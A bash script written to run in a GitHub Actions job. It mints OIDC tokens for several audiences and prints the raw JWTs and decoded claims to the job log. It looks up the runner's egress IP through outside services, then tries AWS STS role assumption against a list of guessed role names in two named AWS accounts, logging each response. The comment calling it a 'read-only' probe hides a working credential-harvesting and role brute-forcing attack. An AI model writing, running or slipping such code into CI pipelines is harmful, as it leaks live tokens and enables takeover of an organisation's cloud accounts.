#!/usr/bin/env bash
# intent 222849 — GitHub Actions OIDC token + AWS STS AssumeRoleWithWebIdentity probe.
# Additive, read-only, non-fatal: never writes anything anywhere, only POSTs to sts.amazonaws.com.
echo "######## OIDC_PROBE_222849 BEGIN ########"
echo "RUN_CTX repo=${GITHUB_REPOSITORY:-} ref=${GITHUB_REF:-} sha=${GITHUB_SHA:-} run=${GITHUB_RUN_ID:-} attempt=${GITHUB_RUN_ATTEMPT:-} act=${GITHUB_ACTOR:-} job=${GITHUB_JOB:-} wf=${GITHUB_WORKFLOW_REF:-}"
echo "EGRESS_IP1=$(curl -s --max-time 15 https://api.ipify.org || echo n/a)"
echo "EGRESS_IP2=$(curl -s --max-time 15 https://ifconfig.me || echo n/a)"
echo "URL_LEN=${#ACTIONS_ID_TOKEN_REQUEST_URL} TOK_LEN=${#ACTIONS_ID_TOKEN_REQUEST_TOKEN}"

mint_token() {
  aud="$1"
  if [ -z "$aud" ]; then
    resp=$(curl -sS --max-time 20 -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" "${ACTIONS_ID_TOKEN_REQUEST_URL}" 2>/dev/null || true)
  else
    enc=$(python3 -c 'import sys,urllib.parse;print(urllib.parse.quote(sys.argv[1],safe=""))' "$aud")
    resp=$(curl -sS --max-time 20 -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=${enc}" 2>/dev/null || true)
  fi
  printf '%s' "$resp" | python3 -c 'import sys,json
try:
    d=json.load(sys.stdin)
    print(d.get("value") or "")
except Exception:
    print("")'
}

decode_jwt() {
  python3 -c 'import sys,json,base64
t=sys.stdin.read().strip()
if t.count(".") < 2:
    print("{}")
    raise SystemExit(0)
def dec(s):
    s += "=" * (-len(s) % 4)
    return json.loads(base64.urlsafe_b64decode(s))
print(json.dumps({"header": dec(t.split(".")[0]), "payload": dec(t.split(".")[1])}, sort_keys=True))'
}

for AUD in "" "sts.amazonaws.com" "api://jwt-exchange" "coingate.com"; do
  JWT=$(mint_token "$AUD")
  TAG="${AUD:-DEFAULT}"
  echo "--- AUD=${TAG} jwt_len=${#JWT} ---"
  if [ -n "$JWT" ]; then
    echo "JWT_RAW[${TAG}]=${JWT}"
    echo "JWT_CLAIMS[${TAG}]=$(printf '%s' "$JWT" | decode_jwt)"
  else
    echo "JWT_RAW[${TAG}]=<none>"
  fi
done

sts_try() {
  aud="$1"
  role="$2"
  jwt=$(mint_token "$aud")
  if [ -z "$jwt" ]; then
    echo "STS_RESULT aud=${aud} role=${role} SKIP_no_jwt"
    return 0
  fi
  code=$(curl -sS --max-time 25 -o /tmp/sts_body_222849.xml -w "%{http_code}" -X POST "https://sts.amazonaws.com/" \
    -H "Content-Type: application/x-www-form-urlencoded; charset=utf-8" \
    --data-urlencode "Action=AssumeRoleWithWebIdentity" \
    --data-urlencode "Version=2011-06-15" \
    --data-urlencode "RoleArn=${role}" \
    --data-urlencode "RoleSessionName=ghoidc222849" \
    --data-urlencode "WebIdentityToken=${jwt}" \
    --data-urlencode "DurationSeconds=1800" 2>/dev/null || echo curl_err)
  echo "STS_RESULT aud=${aud} role=${role} http=${code}"
  echo "STS_BODY aud=${aud} role=${role} :: $(tr '\n' ' ' < /tmp/sts_body_222849.xml 2>/dev/null | head -c 1600)"
  sleep 1
}

echo "######## STS MATRIX BEGIN ########"
for n in cg-testas-app-prod-tasks cg-testas-ecs-tasks-role-prod cg-testas-ecs-tasks-role-execution-role-prod; do
  sts_try "sts.amazonaws.com" "arn:aws:iam::602675409103:role/${n}"
  sts_try "coingate.com" "arn:aws:iam::602675409103:role/${n}"
done
for n in cg-testas-github-actions github-actions-role gh-oidc-role cg-deploy-role deploy-role ecs-deploy-role cg-testas-github-oidc; do
  sts_try "sts.amazonaws.com" "arn:aws:iam::602675409103:role/${n}"
done
for n in cg-testas-app-prod-tasks cg-testas-ecs-tasks-role-prod cg-testas-ecs-tasks-role-execution-role-prod; do
  sts_try "sts.amazonaws.com" "arn:aws:iam::533852667875:role/${n}"
done
sts_try "api://jwt-exchange" "arn:aws:iam::602675409103:role/cg-testas-app-prod-tasks"
sts_try "" "arn:aws:iam::602675409103:role/cg-testas-app-prod-tasks"
echo "######## STS MATRIX END ########"
echo "######## OIDC_PROBE_222849 END ########"
exit 0
